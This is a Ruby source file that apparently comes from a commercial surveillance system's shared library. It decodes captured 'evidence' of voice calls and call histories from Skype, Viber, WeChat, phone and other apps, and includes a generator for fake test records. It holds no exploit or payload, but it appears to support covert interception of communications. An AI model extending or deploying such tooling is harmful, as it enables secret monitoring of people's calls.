
require 'rcs-common/evidence/common'

module RCS

module CallEvidence
  
  LOG_VOICE_VERSION = 2008121901
  CHANNEL = { 0 => :incoming, 1 => :outgoing }
  CALL_PROGRAM = { 0x0141 => :skype,
                   0x0142 => :gtalk,
                   0x0143 => :yahoo,
                   0x0144 => :msn,
                   0x0145 => :phone,
                   0x0146 => :skype,
                   0X0147 => :msn,
                   0x0148 => :viber,
                   0x0149 => :wechat,
                   0x014a => :line,
                 }
  
  def decode_additional_header(data)

    raise EvidenceDeserializeError.new("incomplete evidence") if data.nil? or data.bytesize == 0
    
    stream = StringIO.new data
    version = read_uint32 stream
    
    raise EvidenceDeserializeError.new("invalid log version for voice call") unless version == LOG_VOICE_VERSION
    
    ret = Hash.new
    ret[:data] = Hash.new

    channel = read_uint32 stream
    ret[:data][:channel] = CHANNEL[channel]

    software = read_uint32 stream
    ret[:data][:program] = CALL_PROGRAM[software]

    ret[:data][:sample_rate] = read_uint32 stream
    ret[:data][:incoming] = read_uint32 stream

    low, high = stream.read(8).unpack 'L2'
    ret[:data][:start_time] = Time.from_filetime high, low
    low, high = stream.read(8).unpack 'L2'
    ret[:data][:stop_time] = Time.from_filetime high, low
    
    caller_len = read_uint32 stream
    callee_len = read_uint32 stream
    
    ret[:data][:peer] = "<unknown>" if callee_len == 0

    ret[:data][:caller] ||= stream.read(caller_len).utf16le_to_utf8.lstrip.rstrip if caller_len != 0
    ret[:data][:peer] ||= stream.read(callee_len).utf16le_to_utf8.lstrip.rstrip if callee_len != 0

    ret
  end
  
  def decode_content(common_info, chunks)
    info = Hash[common_info]
    info[:data] ||= Hash.new

    info[:data][:grid_content] = chunks.join

    info[:end_call] = true if info[:data][:grid_content] == "\xff\xff\xff\xff".force_encoding("ASCII-8BIT")
    info[:end_call] ||= false

    yield info if block_given?
    :keep_raw
  end
end

module CalllistoldEvidence

  def content
    raise "Not implemented!"
  end

  def generate_content
    raise "Not implemented!"
  end

  def decode_content(common_info, chunks)

    info = Hash[common_info]
    info[:data] ||= Hash.new

    stream = StringIO.new chunks.join

    @call_list = CallListSerializer.new.unserialize stream

    info[:da] = @call_list.start_time
    info[:data][:peer] = @call_list.fields[:number]
    info[:data][:peer_name] = @call_list.fields[:name] unless @call_list.fields[:name].nil?
    info[:data][:program] = 'Phone'
    info[:data][:status] = :history
    info[:data][:duration] = (@call_list.end_time - @call_list.start_time).to_i
    info[:data][:incoming] = (@call_list.properties.include? :incoming) ? 1 : 0

    yield info if block_given?
    :delete_raw
  end

end # ::CalllistoldEvidence

module CalllistEvidence
  include RCS::Tracer

  ELEM_DELIMITER = 0xABADC0DE

  CALL_INCOMING = 0x01

  PROGRAM_TYPE = {
      0x00 => :phone,
      0x01 => :skype,
      0x02 => :viber,
  }

  def content
    program = [PROGRAM_TYPE.keys.sample].pack('L')
    flags = [[0,1].sample].pack('L')
    users = ["ALoR", "Bruno", "Naga", "Quez", "Tizio", "Caio"]
    from = users.sample.to_utf16le_binary_null
    to = users.sample.to_utf16le_binary_null
    duration = rand(0..500)

    content = StringIO.new
    t = Time.now.getutc
    content.write [t.to_i].pack('L')
    content.write program
    content.write flags
    content.write from
    content.write from
    content.write to
    content.write to
    content.write [duration].pack('L')
    content.write [ ELEM_DELIMITER ].pack('L')

    content.string
  end

  def generate_content
    ret = Array.new
    10.rand_times { ret << content() }
    ret
  end

  def decode_content(common_info, chunks)
    stream = StringIO.new chunks.join

    until stream.eof?
      tm = stream.read(4)
      info = Hash[common_info]
      info[:da] = Time.at(tm.unpack('L').first)
      info[:data] = Hash.new if info[:data].nil?

      program = stream.read(4).unpack('L').first
      info[:data][:program] = PROGRAM_TYPE[program]

      flags = stream.read(4).unpack('L').first
      info[:data][:incoming] = (flags & CALL_INCOMING != 0) ? 1 : 0

      from = stream.read_utf16le_string
      info[:data][:from] = from.utf16le_to_utf8
      from_display = stream.read_utf16le_string
      info[:data][:from_display] = from_display.utf16le_to_utf8

      rcpt = stream.read_utf16le_string
      info[:data][:rcpt] = rcpt.utf16le_to_utf8
      rcpt_display = stream.read_utf16le_string
      info[:data][:rcpt_display] = rcpt_display.utf16le_to_utf8

      info[:data][:duration] = stream.read(4).unpack('L').first

      delim = stream.read(4).unpack("L").first
      raise EvidenceDeserializeError.new("Malformed CALLLIST (missing delimiter)") unless delim == ELEM_DELIMITER

      yield info if block_given?
    end
    :delete_raw
  end
end # CalllistEvidence


end # RCS::